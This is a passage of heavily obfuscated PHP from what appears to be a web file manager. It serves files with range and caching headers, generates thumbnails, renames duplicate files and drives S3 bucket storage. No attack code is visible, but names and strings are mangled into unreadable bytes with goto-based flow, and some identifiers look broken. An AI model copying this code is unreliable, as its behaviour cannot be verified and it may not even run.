($b©äœŠ¹ÂÎ <= $CĞáÓ©ÛìÑ) { $CĞáÓ©ÛìÑ = $b©äœŠ¹ÂÎ; } echo $this->fileSubstr($c¹ñÄ½»‰, $F›‡ÁÅŒ™à, $CĞáÓ©ÛìÑ); $F›‡ÁÅŒ™à += $CĞáÓ©ÛìÑ; if ($CĞáÓ©ÛìÑ == $b©äœŠ¹ÂÎ) { $F›‡ÁÅŒ™à = $a¤ÑÈƒ«± + 1; } if ($b¶°Á»ê£¶) { $bƒ®·¨àê = intval(1000 * 1000 * (timeFloat() - $f¸ÈœÑê)); $aÎµ«Ä„éŒ = $b¶°Á»ê£¶ - $bƒ®·¨àê; if ($aÎµ«Ä„éŒ > 5) { usleep($aÎµ«Ä„éŒ); } } } goto d¹¨‹àÅ™; fù¨ÀÇìñ–: $bÄ–ª¶ÈÚº = strtolower($_SERVER[$cŒñ¨Ê˜ÓÓ[138]]); if ($f—–‡Ñèí¯ && $bÄ–ª¶ÈÚº && $A™öÍ¶«”) { if (strstr($bÄ–ª¶ÈÚº, $cŒñ¨Ê˜ÓÓ[139])) { header($cŒñ¨Ê˜ÓÓ[140] . $c¹ñÄ½»‰); } else { if (strstr($bÄ–ª¶ÈÚº, $cŒñ¨Ê˜ÓÓ[141])) { header($cŒñ¨Ê˜ÓÓ[142] . $c¹ñÄ½»‰); } else { if (strstr($bÄ–ª¶ÈÚº, $cŒñ¨Ê˜ÓÓ[143])) { header($cŒñ¨Ê˜ÓÓ[144] . $c¹ñÄ½»‰); } } } if ($eÕÉ™¥˜ ¨) { header($cŒñ¨Ê˜ÓÓ[145] . $eÕÉ™¥˜ ¨); } return; } if (isset($_SERVER[$cŒñ¨Ê˜ÓÓ[146]])) { if (preg_match($cŒñ¨Ê˜ÓÓ[147], $_SERVER[$cŒñ¨Ê˜ÓÓ[146]], $Añ­è¯Š •)) { $F›‡ÁÅŒ™à = intval($Añ­è¯Š •[1]); if (!empty($Añ­è¯Š •[2])) { $a¤ÑÈƒ«± = intval($Añ­è¯Š •[2]); } } header($cŒñ¨Ê˜ÓÓ[148]); header("\x43\x6f\x6e\164\x65\156\x74\x2d\x52\x61\156\147\145\x3a\x20\x62\171\164\145\x73\40{$F›‡ÁÅŒ™à}\55{$a¤ÑÈƒ«±}\x2f" . $AàÒ±À“Ú«); } else { header($cŒñ¨Ê˜ÓÓ[149]); } goto Aë—‰â´ÀŸ; Aº¬·ø½è: $f—–‡Ñèí¯ = $this->getType() == $cŒñ¨Ê˜ÓÓ[103]; $A™öÍ¶«” = $GLOBALS[$cŒñ¨Ê˜ÓÓ[6]][$cŒñ¨Ê˜ÓÓ[84]][$cŒñ¨Ê˜ÓÓ[91]][$cŒñ¨Ê˜ÓÓ[104]]; $eÕÉ™¥˜ ¨ = (double) $GLOBALS[$cŒñ¨Ê˜ÓÓ[6]][$cŒñ¨Ê˜ÓÓ[84]][$cŒñ¨Ê˜ÓÓ[91]][$cŒñ¨Ê˜ÓÓ[105]] * 1024 * 1024; goto f“¾ˆš¿„Œ; BçƒÑ å¹Ù: header($cŒñ¨Ê˜ÓÓ[121]); header($cŒñ¨Ê˜ÓÓ[122] . $c¤¤®•›á¢); header($cŒñ¨Ê˜ÓÓ[123] . gmdate($cŒñ¨Ê˜ÓÓ[106], time() + 3600 * 24 * 30) . $cŒñ¨Ê˜ÓÓ[124]); goto fê“™Õ›Ôî; cÔŸáãéÆ: if (isset($_SERVER[$cŒñ¨Ê˜ÓÓ[128]]) && strtotime($_SERVER[$cŒñ¨Ê˜ÓÓ[128]]) == $c‹ÆÅù‡ìÕ[$cŒñ¨Ê˜ÓÓ[107]]) { header($cŒñ¨Ê˜ÓÓ[129], !0, 304); die; } if (isset($_SERVER[$cŒñ¨Ê˜ÓÓ[130]]) && $_SERVER[$cŒñ¨Ê˜ÓÓ[130]] == $CÙ¤÷†‡›¦) { header($cŒñ¨Ê˜ÓÓ[131] . $CÙ¤÷†‡›¦, !0, 304); die; } header($cŒñ¨Ê˜ÓÓ[131] . $CÙ¤÷†‡›¦); goto c¸™ÃİÉ›; B«É°ÃôÒå: $F›‡ÁÅŒ™à = 0; $a¤ÑÈƒ«± = $AàÒ±À“Ú« - 1; $c‡À¢×Úñ = $this->ext($cÃ’Æ¸Óê¡); goto AÖìõå²´; cƒöÎš†Í•: $fŸ â¦¥» = rawurlencode($cÃ’Æ¸Óê¡); $fŸ â¦¥» = $cŒñ¨Ê˜ÓÓ[113] . $fŸ â¦¥» . $cŒñ¨Ê˜ÓÓ[117] . $fŸ â¦¥»; if ($f°”ÉŠŠ‡) { header($cŒñ¨Ê˜ÓÓ[118]); header($cŒñ¨Ê˜ÓÓ[119] . $fŸ â¦¥»); } else { header($cŒñ¨Ê˜ÓÓ[120] . $fŸ â¦¥»); } goto BçƒÑ å¹Ù; fê“™Õ›Ôî: header($cŒñ¨Ê˜ÓÓ[125]); header($cŒñ¨Ê˜ÓÓ[126]); header($cŒñ¨Ê˜ÓÓ[127]); goto cÔŸáãéÆ; Fö®”æˆ‹ô: $AàÒ±À“Ú« = $c‹ÆÅù‡ìÕ[$cŒñ¨Ê˜ÓÓ[77]]; $a­ñ‹†„¡¯ = gmdate($cŒñ¨Ê˜ÓÓ[106], $c‹ÆÅù‡ìÕ[$cŒñ¨Ê˜ÓÓ[107]]); $cÃ’Æ¸Óê¡ = $Bá­°îï÷ë ? $Bá­°îï÷ë : $this->iconvApp($c‹ÆÅù‡ìÕ[$cŒñ¨Ê˜ÓÓ[28]]); goto B«É°ÃôÒå; e²ôØ†êƒ: header($cŒñ¨Ê˜ÓÓ[135] . $AàÒ±À“Ú«); header($cŒñ¨Ê˜ÓÓ[136]); if (!$f°”ÉŠŠ‡ && $c‡À¢×Úñ == $cŒñ¨Ê˜ÓÓ[137]) { if ($AàÒ±À“Ú« > 1024 * 1024 * 5) { die; } $ağ¢™ÊâÖ¸ = $this->getContent($c¹ñÄ½»‰); $ağ¢™ÊâÖ¸ = Html::removeXXS($ağ¢™ÊâÖ¸); echo $ağ¢™ÊâÖ¸; die; } goto fù¨ÀÇìñ–; D¡ÓÊô¬±Ö: $c¤¤®•›á¢ = get_file_mime($c‡À¢×Úñ); if (strstr($c¤¤®•›á¢, $cŒñ¨Ê˜ÓÓ[114])) { $c¤¤®•›á¢ = $c¤¤®•›á¢ . $cŒñ¨Ê˜ÓÓ[115]; } if ($f°”ÉŠŠ‡ === !1 && !mime_support($c¤¤®•›á¢)) { $f°”ÉŠŠ‡ = !0; $c¤¤®•›á¢ = $cŒñ¨Ê˜ÓÓ[116]; } goto cƒöÎš†Í•; AÖìõå²´: if (in_array($c‡À¢×Úñ, array($cŒñ¨Ê˜ÓÓ[108], $cŒñ¨Ê˜ÓÓ[109], $cŒñ¨Ê˜ÓÓ[110], $cŒñ¨Ê˜ÓÓ[111]))) { $c‡À¢×Úñ = $cŒñ¨Ê˜ÓÓ[112]; } if (!$CÙ¤÷†‡›¦) { $CÙ¤÷†‡›¦ = md5($a­ñ‹†„¡¯ . $this->hashSimple($c¹ñÄ½»‰)); } $CÙ¤÷†‡›¦ = $cŒñ¨Ê˜ÓÓ[113] . $CÙ¤÷†‡›¦ . $cŒñ¨Ê˜ÓÓ[113]; goto D¡ÓÊô¬±Ö; f“¾ˆš¿„Œ: @ob_end_clean(); set_timeout(); $c‹ÆÅù‡ìÕ = $this->infoFull($c¹ñÄ½»‰); goto Fö®”æˆ‹ô; AÆÁÃ·²£ç: $cŒñ¨Ê˜ÓÓ =& $_SERVER[¼]; $this->cacheMethod(null, null); if (!$c¹ñÄ½»‰ || !$this->exist($c¹ñÄ½»‰)) { show_json(LNG($cŒñ¨Ê˜ÓÓ[102]), !1, $Bá­°îï÷ë); } goto Aº¬·ø½è; c¸™ÃİÉ›: header($cŒñ¨Ê˜ÓÓ[132] . $a­ñ‹†„¡¯ . $cŒñ¨Ê˜ÓÓ[124]); header($cŒñ¨Ê˜ÓÓ[133] . $cÃ’Æ¸Óê¡); header($cŒñ¨Ê˜ÓÓ[134]); goto e²ôØ†êƒ; Aë—‰â´ÀŸ: header($cŒñ¨Ê˜ÓÓ[150] . ($a¤ÑÈƒ«± - $F›‡ÁÅŒ™à + 1)); if ($_SERVER[$cŒñ¨Ê˜ÓÓ[151]] == $cŒñ¨Ê˜ÓÓ[152]) { return; } $CĞáÓ©ÛìÑ = 1024 * 100; goto FÅ¢×ÂŒ´Í; d¹¨‹àÅ™: } public function fileOutServer($CÓ»øäÎ°Ã, $A°óÜ²÷‹ = false, $b•ŸæìŸÔ = false, $cÅŞŸóàİ¦ = '') { $this->fileOut($CÓ»øäÎ°Ã, $A°óÜ²÷‹, $b•ŸæìŸÔ, $cÅŞŸóàİ¦); } public function fileOutLink($f´‹›¦Ìš) { header($_SERVER[¼][153] . $f´‹›¦Ìš); die; } public function cacheMethod($fêÕÛ±–»„, $Aùï³òÉ²Š) { goto fõ£ÃæœÑÉ; Bä³Š›õ: if (!is_null($a™¢ß¬»‘ã)) { return $a™¢ß¬»‘ã; } $a™¢ß¬»‘ã = $this->{$fêÕÛ±–»„}($Aùï³òÉ²Š); $c›Õï…ò×½[$Cğ©”Ş‚² ] = $a™¢ß¬»‘ã; goto a ÈÀä¤¹»; a ÈÀä¤¹»: return $a™¢ß¬»‘ã; goto b†æªòã¥; f¯šĞº½ˆ: if (is_null($fêÕÛ±–»„)) { $c›Õï…ò×½ = array(); return; } if (is_null($Aùï³òÉ²Š)) { unset($c›Õï…ò×½[$Cğ©”Ş‚² ]); return; } $a™¢ß¬»‘ã = isset($c›Õï…ò×½[$Cğ©”Ş‚² ]) ? $c›Õï…ò×½[$Cğ©”Ş‚² ] : null; goto Bä³Š›õ; fõ£ÃæœÑÉ: $Bµç‡õØ¼ =& $_SERVER[¼]; static $c›Õï…ò×½ = array(); $Cğ©”Ş‚²  = $Bµç‡õØ¼[154] . $fêÕÛ±–»„ . $Bµç‡õØ¼[155] . rtrim($Aùï³òÉ²Š, $Bµç‡õØ¼[8]); goto f¯šĞº½ˆ; b†æªòã¥: } public function fileOutImage($A¢“©‘ùÆÊ, $Dáô¿ÏÅ•â = 250) { goto C§§¯ÖçœŠ; fãÖ°æº© : $A‹‰‘½¼¶Ä = DATA_THUMB . $f®ŒÎÔå‰ö; if (!@file_exists($A‹‰‘½¼¶Ä)) { $c³ô‡ª“¦â = TEMP_FILES; if (!is_dir($c³ô‡ª“¦â)) { mk_dir($c³ô‡ª“¦â); } $EçÙä‘™øÃ = $c³ô‡ª“¦â . $Bù³Ò—©œ… . $EÄáèÊÃ©Ÿ[93] . $eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[157]]; if (!@file_exists($EçÙä‘™øÃ)) { $EçÙä‘™øÃ = $this->download($A¢“©‘ùÆÊ, $EçÙä‘™øÃ); } $F‰‚¥†ˆÍÚ = new ImageThumb($EçÙä‘™øÃ, $EÄáèÊÃ©Ÿ[164]); $F‰‚¥†ˆÍÚ->prorate($A‹‰‘½¼¶Ä, $Dáô¿ÏÅ•â, $Dáô¿ÏÅ•â * 10); } if (!file_exists($A‹‰‘½¼¶Ä) || filesize($A‹‰‘½¼¶Ä) < 100) { return @file_exists($EçÙä‘™øÃ) ? IO::fileOut($EçÙä‘™øÃ) : $this->fileOut($A¢“©‘ùÆÊ); } goto cˆ‰ÓîğŠ¥; DÊºóƒÌêÔ: if ($eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[77]] <= 1024 * 50 || !function_exists($EÄáèÊÃ©Ÿ[156]) || $eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[157]] == $EÄáèÊÃ©Ÿ[158]) { return $this->fileOut($A¢“©‘ùÆÊ); } if (isset($eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[159]][$EÄáèÊÃ©Ÿ[160]])) { $Bù³Ò—©œ… = $eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[159]][$EÄáèÊÃ©Ÿ[160]]; } else { if (isset($eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[159]][$EÄáèÊÃ©Ÿ[161]])) { $Bù³Ò—©œ… = $eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[159]][$EÄáèÊÃ©Ÿ[161]]; } else { $Bù³Ò—©œ… = md5("{$eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[28]]}\137{$eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[75]]}\137{$eø‡˜«ˆ¦[$EÄáèÊÃ©Ÿ[77]]}"); } } $f®ŒÎÔå‰ö = "{$Bù³Ò—©œ…}\x5f{$Dáô¿ÏÅ•â}\x2e\160\x6e\147"; goto FÑ„‚åº’Â; C§§¯ÖçœŠ: $EÄáèÊÃ©Ÿ =& $_SERVER[¼]; if (substr($A¢“©‘ùÆÊ, 0, 4) == $EÄáèÊÃ©Ÿ[143]) { $this->fileOutLink($A¢“©‘ùÆÊ); } $eø‡˜«ˆ¦ = $this->info($A¢“©‘ùÆÊ); goto DÊºóƒÌêÔ; cˆ‰ÓîğŠ¥: if (!($eÀÓ¾¨Ë• = IO::move($A‹‰‘½¼¶Ä, $bÁëßĞğò))) { return IO::fileOut($A‹‰‘½¼¶Ä); } del_file($A‹‰‘½¼¶Ä); IO::fileOut($eÀÓ¾¨Ë•); goto e˜ÌôÂò­¶; FÑ„‚åº’Â: if (!($aì¯–“ºğ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $EÄáèÊÃ©Ÿ[162]))) { $bÁëßĞğò = IO::mkdir(IO_PATH_SYSTEM_TEMP . $EÄáèÊÃ©Ÿ[163]); } else { $bÁëßĞğò = KodIO::make($aì¯–“ºğ); } if ($aì¯–“ºğ = IO::fileNameExist($bÁëßĞğò, $f®ŒÎÔå‰ö)) { $A‹‰‘½¼¶Ä = KodIO::make($aì¯–“ºğ); return IO::fileOut($A‹‰‘½¼¶Ä); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto fãÖ°æº© ; e˜ÌôÂò­¶: } public function fileOutImageServer($aµÜÙæ°Ï“, $fÅÙ‡øÖ† = 250) { $this->fileOutImage($aµÜÙæ°Ï“, $fÅÙ‡øÖ†); } public function fileNameAuto($c¶äê›‘‘‰, $C­è­î—Äô, $d•é²¬§¥‚ = REPEAT_RENAME, $f¨Íª‡‘ê = false) { goto c÷§Â—¯é; c÷§Â—¯é: $BÎªÕŞ½ãÚ =& $_SERVER[¼]; $C†À’¾£ÊÔ = $c¶äê›‘‘‰ === $BÎªÕŞ½ãÚ[33] ? $C­è­î—Äô : rtrim($c¶äê›‘‘‰, $BÎªÕŞ½ãÚ[8]) . $BÎªÕŞ½ãÚ[8] . $C­è­î—Äô; if ($d•é²¬§¥‚ == REPEAT_REPLACE || !$this->exist($C†À’¾£ÊÔ) || $f¨Íª‡‘ê && $d•é²¬§¥‚ != REPEAT_RENAME_FOLDER) { return $C­è­î—Äô; } goto e¦öé¢×Ù†; bË¤á›ª…: $b‘«Ë—ÈË” = 1; $d©µ‰ƒ¤ÇË = substr($C­è­î—Äô, 0, strlen($C­è­î—Äô) - strlen($a‹Ò¹ÅñÄÏ)); $BËÀ‘ó’ÈÉ = $d©µ‰ƒ¤ÇË . "\50{$b‘«Ë—ÈË”}\51{$a‹Ò¹ÅñÄÏ}"; goto e¶ëã½¢¾Ø; e¶ëã½¢¾Ø: while ($this->exist(rtrim($c¶äê›‘‘‰, $BÎªÕŞ½ãÚ[8]) . $BÎªÕŞ½ãÚ[8] . $BËÀ‘ó’ÈÉ)) { $BËÀ‘ó’ÈÉ = $d©µ‰ƒ¤ÇË . "\x28{$b‘«Ë—ÈË”}\51{$a‹Ò¹ÅñÄÏ}"; $b‘«Ë—ÈË”++; } return $BËÀ‘ó’ÈÉ; goto Aì„À‡ÍéÈ; e¦öé¢×Ù†: if ($d•é²¬§¥‚ == REPEAT_SKIP) { return !1; } $a‹Ò¹ÅñÄÏ = $BÎªÕŞ½ãÚ[93] . get_path_ext($C­è­î—Äô); $a‹Ò¹ÅñÄÏ = $a‹Ò¹ÅñÄÏ == $BÎªÕŞ½ãÚ[93] || $f¨Íª‡‘ê ? $BÎªÕŞ½ãÚ[33] : $a‹Ò¹ÅñÄÏ; goto bË¤á›ª…; Aì„À‡ÍéÈ: } public function listAllFiles($e‰èá‘î”Ë, $b˜Í’Öˆ×ª, $aİñ„×èĞ§ = array()) { goto bèØ¦Åİá; cø¾ÄÅÍĞ›: $e‰èá‘î”Ë = trim($e‰èá‘î”Ë, $c˜ŠÆÒÒ¥[8]); foreach ($b˜Í’Öˆ×ª as $bÑŠ¡”é˜ß) { $fĞ›˜İŸí… = ltrim(substr($bÑŠ¡”é˜ß, strlen($e‰èá‘î”Ë)), $c˜ŠÆÒÒ¥[8]); $c¡¡¤‡× = array_merge($c¡¡¤‡×, $this->slicePath($fĞ›˜İŸí…)); } $e¼öÈÉó´ = array(); goto AÂ¨Ë¥ø·ù; AÂ¨Ë¥ø·ù: foreach (array_unique($c¡¡¤‡×) as $bÑŠ¡”é˜ß) { $b‰ĞíÛˆ‡¾ = array($c˜ŠÆÒÒ¥[75] => $this->getPathOuter($c˜ŠÆÒÒ¥[8] . $e‰èá‘î”Ë . $c˜ŠÆÒÒ¥[8] . $bÑŠ¡”é˜ß), $c˜ŠÆÒÒ¥[76] => 1, $c˜ŠÆÒÒ¥[77] => 0); if (substr($bÑŠ¡”é˜ß, -1) != $c˜ŠÆÒÒ¥[8]) { $b‰ĞíÛˆ‡¾[$c˜ŠÆÒÒ¥[76]] = 0; $BŸõË¨ó = $this->getPath($e‰èá‘î”Ë . $c˜ŠÆÒÒ¥[8] . $bÑŠ¡”é˜ß); $b‰ĞíÛˆ‡¾[$c˜ŠÆÒÒ¥[77]] = isset($aİñ„×èĞ§[$BŸõË¨ó]) ? $aİñ„×èĞ§[$BŸõË¨ó] : $this->size($BŸõË¨ó); } $e¼öÈÉó´[] = $b‰ĞíÛˆ‡¾; } return $e¼öÈÉó´; goto CÍÁÄÕ¹´¦; bèØ¦Åİá: $c˜ŠÆÒÒ¥ =& $_SERVER[¼]; if (empty($b˜Í’Öˆ×ª)) { return array(); } $c¡¡¤‡× = array(); goto cø¾ÄÅÍĞ›; CÍÁÄÕ¹´¦: } public function slicePath($A‰’¡Ô©É) { $d·ŒùÆ ¿Ü =& $_SERVER[¼]; $EÊ¯‡²œ“Ÿ = explode($d·ŒùÆ ¿Ü[8], trim($A‰’¡Ô©É, $d·ŒùÆ ¿Ü[8])); $FºÙÍÑì‡– = 0; do { ++$FºÙÍÑì‡–; $B¢‚Ú™ğ¼[] = implode($d·ŒùÆ ¿Ü[8], array_slice($EÊ¯‡²œ“Ÿ, 0, $FºÙÍÑì‡–)) . $d·ŒùÆ ¿Ü[8]; } while ($FºÙÍÑì‡– < count($EÊ¯‡²œ“Ÿ)); $B¢‚Ú™ğ¼[count($EÊ¯‡²œ“Ÿ) - 1] = $A‰’¡Ô©É; return $B¢‚Ú™ğ¼; } public function getHost() { $C…¹íøÓÑ =& $_SERVER[¼]; $DÛÄ¡•²®Ü = parse_url(trim($this->domain, $C…¹íøÓÑ[8])); $cšáµìïËæ = isset($DÛÄ¡•²®Ü[$C…¹íøÓÑ[165]]) ? $DÛÄ¡•²®Ü[$C…¹íøÓÑ[165]] : http_type(); $Dô±àÀó´ = isset($DÛÄ¡•²®Ü[$C…¹íøÓÑ[166]]) ? $DÛÄ¡•²®Ü[$C…¹íøÓÑ[166]] : $DÛÄ¡•²®Ü[$C…¹íøÓÑ[75]]; if (isset($DÛÄ¡•²®Ü[$C…¹íøÓÑ[167]])) { $Dô±àÀó´ .= $C…¹íøÓÑ[4] . $DÛÄ¡•²®Ü[$C…¹íøÓÑ[167]]; } return $cšáµìïËæ . $C…¹íøÓÑ[168] . $Dô±àÀó´; } public function pathEncode($bÏ»îÛÖ«) { $D§£æ¼ÏšÆ =& $_SERVER[¼]; return str_replace($D§£æ¼ÏšÆ[169], $D§£æ¼ÏšÆ[8], rawurlencode($bÏ»îÛÖ«)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($f´ÙÍàº—) { set_timeout(); require_once SDK_DIR . $_SERVER[¼][170]; parent::__construct(); $this->_init($f´ÙÍàº—); } public function _init($eõêÇ±£Ü) { foreach ($eõêÇ±£Ü as $CÅÍ‚ÎåŞ => $EÓ„‡´ç„) { if (isset($this->{$CÅÍ‚ÎåŞ})) { $this->{$CÅÍ‚ÎåŞ} = $EÓ„‡´ç„; } } $this->endpoint = $eõêÇ±£Ü[$_SERVER[¼][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($E°Ùƒø¢óó = "\x76\64") { $this->signVer = $E°Ùƒø¢óó; $this->client->setSignatureVersion($E°Ùƒø¢óó); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto E®ì´‹­È; Fõ ÙíÎ©ô: $Eê÷„Ì×ÄŸ = array($BßÀ‚Ñ¹¾[177], $BßÀ‚Ñ¹¾[178], $BßÀ‚Ñ¹¾[179], $BßÀ‚Ñ¹¾[180], $BßÀ‚Ñ¹¾[181]); $cĞàÒ¥˜èÏ = array_diff($Eê÷„Ì×ÄŸ, $Dö‡ „“¤); return empty($cĞàÒ¥˜èÏ); goto D¶ ©Ÿãß˜; dÕø˜ª±÷: if ($C‹é†¤’†Õ[$BßÀ‚Ñ¹¾[172]] != $BßÀ‚Ñ¹¾[173] || $C‹é†¤’†Õ[$BßÀ‚Ñ¹¾[174]] != $BßÀ‚Ñ¹¾[173]) { return !1; } $Dö‡ „“¤ = array_map($BßÀ‚Ñ¹¾[175], $C‹é†¤’†Õ[$BßÀ‚Ñ¹¾[176]]); if (!is_array($Dö‡ „“¤)) { $Dö‡ „“¤ = array(); } goto Fõ ÙíÎ©ô; E®ì´‹­È: $BßÀ‚Ñ¹¾ =& $_SERVER[¼]; $C‹é†¤’†Õ = $this->getBucketCors(); if (!$C‹é†¤’†Õ || !is_array($C‹é†¤’†Õ)) { return !1; } goto dÕø˜ª±÷; D¶ ©Ÿãß˜: } public function mkfile($cô’„¦¶ªİ, $F’É„åÕ×± = '', $d¾éò ´ˆ‚ = REPEAT_RENAME) { $FÔŸˆ¦êºÃ = $this->setContent($cô’„¦¶ªİ, $F’É„åÕ×±); if ($FÔŸˆ¦êºÃ !== !1) { return $this->getPathOuter($cô’„¦¶ªİ); } return !1; } public function mkdir($b‚•¬¬ñ‘Ø, $CÚŒÆƒ¦ÅÕ = REPEAT_SKIP) { if (empty($b‚•¬¬ñ‘Ø)) { return !1; } if ($this->_isFolder($b‚•¬¬ñ‘Ø)) { return $this->getPathOuter($b‚•¬¬ñ‘Ø); } $D‡÷À¥Î§Š = $this->setContent($b‚•¬¬ñ‘Ø, $_SERVER[¼][33], !0); if ($D‡÷À¥Î§Š !== !1) { return $this->getPathOuter($b‚•¬¬ñ‘Ø); } return !1; } public function copyFile($CœàÉ¸İñ, $dš‡ãòÁ°, $Fƒ ù› æÂ = array()) { $eğùèŠô—è =& $_SERVER[¼]; $A¢©ßŞ° = $this->objectMeta($CœàÉ¸İñ); if (!$A¢©ßŞ°) { return !1; } if ($A¢©ßŞ°[$eğùèŠô—è[77]] <= 1024 * 1024 * 200) { $d¨à—’ÓÃ = $this->client->copyObject($this->bucket, $CœàÉ¸İñ, $this->bucket, $dš‡ãòÁ°, $eğùèŠô—è[182], $Fƒ ù› æÂ); } else { $d¨à—’ÓÃ = $this->client->multiCopyObject($this->bucket, $CœàÉ¸İñ, $this->bucket, $dš‡ãòÁ°, $Fƒ ù› æÂ); } $d¨à—’ÓÃ = $d¨à—’ÓÃ ? $this->getPathOuter($dš‡ãòÁ°) : !1; return $d¨à—’ÓÃ; } public function moveFile($eÚŸĞİ­åŞ, $Fè´ÏÚö¾ö) { if ($this->copyFile($eÚŸĞİ­åŞ, $Fè´ÏÚö¾ö)) { $this->delFile($eÚŸĞİ­åŞ); return $this->getPathOuter($Fè´ÏÚö¾ö); } return !1; } public function delFile($AÍ¯ñ¶«Ãé) { return $this->client->deleteObject($this->bucket, $AÍ¯ñ¶«Ãé); } public function delFolder($E…ÔÜèòá³) { goto EïÀ‡òòâï; EïÀ‡òòâï: $DÙñÙ‚†£ =& $_SERVER[¼]; $f¾˜õ‚Õ„ö = $this->listObjs($E…ÔÜèòá³); if (!$f¾˜õ‚Õ„ö) { $E…ÔÜèòá³ = trim($E…ÔÜèòá³, $DÙñÙ‚†£[8]); if (!empty($E…ÔÜèòá³)) { $E…ÔÜèòá³ .= $DÙñÙ‚†£[8]; } return $this->delFile($E…ÔÜèòá³); } goto FİÇ¡ëƒ‘©; D÷¡Ğïêê: return $F§¶êİìÃä === $F£–Ç¥é” ? !0 : !1; goto B…İ×¿‚µ; FİÇ¡ëƒ‘©: $F§¶êİìÃä = $F£–Ç¥é” = 0; $B¿çë¨ÒŞ› = array_chunk(array_keys($f¾˜õ‚Õ„ö), 1000); foreach ($B¿çë¨ÒŞ› as $f“‹½Ñ™ƒŠ) { $F§¶êİìÃä++; $F£–Ç¥é” += (int) $this->client->deleteObjects($this->bucket, $f“‹½Ñ™ƒŠ); } goto D÷¡Ğïêê; B…İ×¿‚µ: } public function rename($cÌ½ˆÂÈ¬, $Eš¸£ÍÑè°) { return $this->renameObject($cÌ½ˆÂÈ¬, $Eš¸£ÍÑè°); } public function listPath($DÛŒ–Å– , $c„—»æÀöã = false) { $B£Õ®…¸ï² =& $_SERVER[¼]; $bÑÁÏ„÷¾ê = $this->listObjs($DÛŒ–Å– , null, null, $B£Õ®…¸ï²[8]); $bØ©ë¾åíÂ = array($B£Õ®…¸ï²[74] => array(), $B£Õ®…¸ï²[73] => array()); foreach ($bÑÁÏ„÷¾ê as $D£˜†ØÁ¸İ => $FÎ¡Îæˆ³†) { if ($D£˜†ØÁ¸İ == $B£Õ®…¸ï²[8]) { continue; } if (isset($FÎ¡Îæˆ³†[$B£Õ®…¸ï²[183]])) { $bØ©ë¾åíÂ[$B£Õ®…¸ï²[74]][] = $this->folderInfo($FÎ¡Îæˆ³†[$B£Õ®…¸ï²[183]], $c„—»æÀöã); } else { if (substr($FÎ¡Îæˆ³†[$B£Õ®…¸ï²[28]], -1) == $B£Õ®…¸ï²[8]) { continue; } $bØ©ë¾åíÂ[$B£Õ®…¸ï²[73]][] = $this->fileInfo($FÎ¡Îæˆ³†[$B£Õ®…¸ï²[28]], $c„—»æÀöã, $FÎ¡Îæˆ³†); } } return $bØ©ë¾åíÂ; } private function fileInfo($f—„·¡¥Ì, $AÜöù‰°Ï„ = false, $c»ëª‘§Ä = array()) { goto E÷Ù±òºöİ; dßÅÁ«ï±: return $e§…ˆœ‚µ; goto aãâÁ©æäÌ; E÷Ù±òºöİ: $EÉçáÛ§‹¿ =& $_SERVER[¼]; if ($AÜöù‰°Ï„) { return array($EÉçáÛ§‹¿[28] => $this->pathThis($f—„·¡¥Ì), $EÉçáÛ§‹¿[75] => $this->getPathOuter($f—„·¡¥Ì), $EÉçáÛ§‹¿[29] => $EÉçáÛ§‹¿[164], $EÉçáÛ§‹¿[157] => $this->ext($f—„·¡¥Ì), $EÉçáÛ§‹¿[77] => isset($c»ëª‘§Ä[$EÉçáÛ§‹¿[77]]) ? $c»ëª‘§Ä[$EÉçáÛ§‹¿[77]] : 0, $EÉçáÛ§‹¿[184] => 0, $EÉçáÛ§‹¿[107] => 0, $EÉçáÛ§‹¿[185] => !0, $EÉçáÛ§‹¿[186] => !0); } $e§…ˆœ‚µ = array($EÉçáÛ§‹¿[28] => $this->pathThis($f—„·¡¥Ì), $EÉçáÛ§‹¿[75] => $this->getPathOuter($f—„·¡¥Ì), $EÉçáÛ§‹¿[29] => $EÉçáÛ§‹¿[164], $EÉçáÛ§‹¿[184] => 0, $EÉçáÛ§‹¿[107] => 0, $EÉçáÛ§‹¿[77] => 0, $EÉçáÛ§‹¿[157] => $this->ext($f—„·¡¥Ì), $EÉçáÛ§‹¿[185] => !0, $EÉçáÛ§‹¿[186] => !0); goto CªÉÚó»Á; CªÉÚó»Á: if (empty($c»ëª‘§Ä)) { $c»ëª‘§Ä = $this->objectMeta($f—„·¡¥Ì); if (!$c»ëª‘§Ä) { return $e§…ˆœ‚µ; } } if (isset($c»ëª‘§Ä[$EÉçáÛ§‹¿[187]])) { $e§…ˆœ‚µ[$EÉçáÛ§‹¿[107]] = $c»ëª‘§Ä[$EÉçáÛ§‹¿[187]]; } if (isset($c»ëª‘§Ä[$EÉçáÛ§‹¿[77]])) { $e§…ˆœ‚µ[$EÉçáÛ§‹¿[77]] = $c»ëª‘§Ä[$EÉçáÛ§‹¿[77]]; } goto dßÅÁ«ï±; aãâÁ©æäÌ: } private function folderInfo($dõÒœÀÎå, $Eò¼¥àÃ¼Ö = false) { goto D‘…ÚÒÁ••; Cœ©îØªì: if (isset($dÑì°öä½«[$dÇ™²ŸÒ[187]])) { $DÓ±†¶è–ó[$dÇ™²ŸÒ[184]] = $dÑì°öä½«[$dÇ™²ŸÒ[187]]; } return $DÓ±†¶è–ó; goto cÄÙÍŸ¾±Ø; f£–Åœ©º: if ($dõÒœÀÎå == $dÇ™²ŸÒ[33]) { return $DÓ±†¶è–ó; } $dõÒœÀÎå = trim($dõÒœÀÎå, $dÇ™²ŸÒ[8]) . 